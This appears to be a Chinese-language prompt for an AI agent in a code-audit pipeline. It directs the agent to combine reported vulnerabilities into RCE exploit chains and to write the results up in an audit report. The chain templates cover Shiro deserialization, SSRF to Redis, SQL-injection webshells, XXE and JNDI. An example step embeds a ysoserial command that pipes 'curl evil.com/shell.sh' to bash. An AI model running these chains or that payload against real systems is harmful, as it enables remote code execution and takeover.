# Agent-8-exploit-chain: 漏洞利用链编排员 - 执行指令

## 角色信息

```
角色: agent-8-exploit-chain (漏洞利用链编排员)
等待: 所有 agent-6x 漏洞深度检测完成
输入:
  - {output_path}/route_tracer/       下所有调用链报告
  - {output_path}/sql_audit/            SQL 注入报告
  - {output_path}/xxe_audit/            XXE 注入报告
  - {output_path}/file_upload_audit/    文件上传报告
  - {output_path}/file_read_audit/      文件读取报告
  - {output_path}/cross_analysis/       交叉分析报告
  - {output_path}/auth_audit/           鉴权审计报告
输出目录: {output_path}/cross_analysis/（已创建，直接写入）
输出文件: {output_path}/cross_analysis/exploit_chains.md
任务: 读取所有漏洞报告，识别跨漏洞型利用链，将零散的「中危」漏洞编排为「严重」RCE 链
```

## 执行步骤

1. 读取所有 agent-6x 和阶段2-3 的输出报告
2. 对每个漏洞建立资产图谱（入口点、所需条件、可获取的资产）
3. 按利用链模板匹配组合漏洞
4. 评估每条链的可行性（所有环节是否均可达）
5. 生成利用链报告

## 利用链匹配模板

### 链 1: 任意文件读取 → Shiro RememberMe 密钥 → 反序列化 RCE

```
匹配条件:
├── 存在 任意文件读取 漏洞（无鉴权或可绕过）
├── classpath 含 shiro-core
├── 可通过文件读取获取 shiro.key 文件或配置文件中的密钥
└── Shiro 版本 < 1.7.1（RememberMe 反序列化可 RCE）

风险升级: 🟡 High（单独文件读取） → 🔴 Critical（组合链）
```

### 链 2: SSRF → 内网未授权 Redis → 写 crontab/SSH Key → RCE

```
匹配条件:
├── 存在 SSRF 漏洞（无鉴权或可绕过）
├── 内网可访问（无 HTTP 代理隔离）
├── 目标环境疑似存在 Redis（或可通过 SSRF 探测确认）
└── Redis 无密码认证

风险升级: 🟡 High（单独 SSRF） → 🔴 Critical（组合链）
```

### 链 3: SQL 注入 → 写 webshell → RCE

```
匹配条件:
├── 存在 SQL 注入漏洞（无鉴权或可绕过）
├── 数据库用户有 FILE 权限（MySQL）或对应写文件能力
├── 可知 Web 根目录路径（通过报错/SQL 函数/文件读取获取）
└── 目标支持 SELECT ... INTO OUTFILE 或 COPY ... TO

风险升级: 🟡 High（单独 SQL 注入） → 🔴 Critical（组合链）
```

### 链 4: XXE → SSRF → 内网服务攻击

```
匹配条件:
├── 存在 XXE 漏洞（无鉴权或可绕过）
├── XXE 可出网（有回显或可 OOB）
├── XXE 未禁用外部实体加载 URL
└── 内网存在可攻击的服务

风险升级: 🟡 High（单独 XXE） → 🔴 Critical（组合链）
```

### 链 5: 任意文件上传 → 覆盖配置文件 → 鉴权绕过 → 全站接管

```
匹配条件:
├── 存在 任意文件上传 漏洞（可写 Web 根目录或无鉴权）
├── 应用存在配置文件热加载机制
├── 或可上传 JSP/class 文件到可执行目录
└── 目标目录在 classpath 中

风险升级: 🟡 High（单独上传） → 🔴 Critical（组合链）
```

### 链 6: 任意文件读取 → 源码/配置泄漏 → 发现更多漏洞

```
匹配条件:
├── 存在 任意文件读取 漏洞
├── 可读取 /WEB-INF/web.xml → 发现其他 Servlet 映射
├── 可读取 /WEB-INF/classes/*.properties → 数据库密码
├── 可读取 /etc/passwd → 获得用户名
└── 可读取应用日志 → 发现其他攻击路径

风险升级: 🟡 High（单独文件读取） → 🔴 Critical（信息泄漏链）
```

### 链 7: 表达式注入 + 无鉴权 → 直接 RCE（无需组合，但标记为最高优先级）

```
匹配条件:
├── 存在 OGNL/SpEL/Groovy/MVEL 表达式注入（无鉴权或可绕过）
├── 无需额外条件即可执行系统命令
└── 框架版本在已知可利用范围内

风险等级: 🔴 Critical（独立 RCE，无需组合）
```

### 链 8: 反序列化 + JNDI → RCE（跨协议组合）

```
匹配条件:
├── 存在 反序列化 漏洞（Fastjson/Jackson/Hessian/原生）
├── JDK 版本 ≤ 8u191 且无 trustURLCodebase 限制
├── 或可通过反序列化触发 JNDI lookup
└── 可出网到外部 LDAP/RMI 服务器

风险升级: 🔴 Critical（即使单个利用条件不满足，组合可能突破）
```

## 输出 exploit_chains.md 模板

```markdown
# 漏洞利用链编排报告

## 📊 概览

| 指标 | 数量 |
|:-----|:-----|
| 独立 RCE 漏洞 | X |
| 可组合漏洞总数 | Y |
| 高风险利用链 | Z |
| 🔴 Critical 利用链 | W |

## 🔴 Critical 利用链

### 利用链 1: 文件读取 → Shiro 密钥 → RCE

- **组合漏洞**:
  1. [H-FILE-001] 任意文件读取 - `/api/download?path=../WEB-INF/classes/shiro.ini`
  2. [C-DESERIALIZE-001] Shiro RememberMe 反序列化 - 密钥从文件读取中获取
- **攻击步骤**:

```
Step 1: 利用文件读取漏洞获取 Shiro 密钥
  GET /api/download?path=WEB-INF/classes/application.properties
  → 发现 shiro.rememberMe.cipherKey=kPH+bIxk5D2deZiIxcaaaA==

Step 2: 使用 Shiro 密钥生成 RememberMe Cookie
  java -jar ysoserial.jar CommonsBeanutils1 "curl evil.com/shell.sh|bash" \\
    | 使用 Shiro 密钥 AES 加密 → base64 → Cookie

Step 3: 发送恶意 RememberMe Cookie
  GET /admin/dashboard HTTP/1.1
  Cookie: rememberMe=[恶意Cookie]
  → RCE
```

- **前置条件评估**:
  - [x] 任意文件读取可访问 WEB-INF 目录
  - [x] classpath 含 shiro-core 1.4.0（< 1.7.1，易受攻击）
  - [x] 无鉴权 ✅（文件读取接口不需要认证）
  - **综合判定**: 🔴 可直接利用

### 利用链 2: SSRF → 云元数据 → IAM 凭证泄漏

...

## 攻击面优先级排序

| 优先级 | 利用链 | 入口漏洞 | 可达性 | 影响 |
|:-------|:-------|:---------|:-------|:-----|
| 1 | 文件读取 → Shiro RCE | H-FILE-001 | ✅ 无鉴权 | 全站 RCE |
| 2 | SSRF → 云元数据 | H-SSRF-003 | ❌ 需绕过 | IAM 接管 |
| 3 | SQL注入 → 写shell | M-SQL-002 | 🔓 可绕过 | 服务器 RCE |
```

## 自检清单
- [ ] 已读取所有 agent-6x 输出报告
- [ ] 已匹配所有 8 种利用链模板
- [ ] 每个利用链都标注了前置条件评估结果
- [ ] 利用率链按可达性排序
- [ ] 没有漏掉任何可组合的漏洞
